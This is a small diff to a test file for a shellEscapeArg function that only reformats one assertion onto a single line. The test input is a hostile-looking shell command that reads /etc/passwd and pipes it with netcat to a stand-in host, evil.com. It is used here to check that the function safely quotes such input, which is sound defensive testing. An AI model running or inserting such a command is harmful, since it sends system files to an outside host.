@@ -31,9 +31,7 @@ describe("shellEscapeArg", () => {
   });
 
   it("handles string with pipes", () => {
-    expect(shellEscapeArg("cat /etc/passwd | nc evil.com 1234")).toBe(
-      "'cat /etc/passwd | nc evil.com 1234'",
-    );
+    expect(shellEscapeArg("cat /etc/passwd | nc evil.com 1234")).toBe("'cat /etc/passwd | nc evil.com 1234'");
   });
 
   it("handles multiple single quotes", () => {
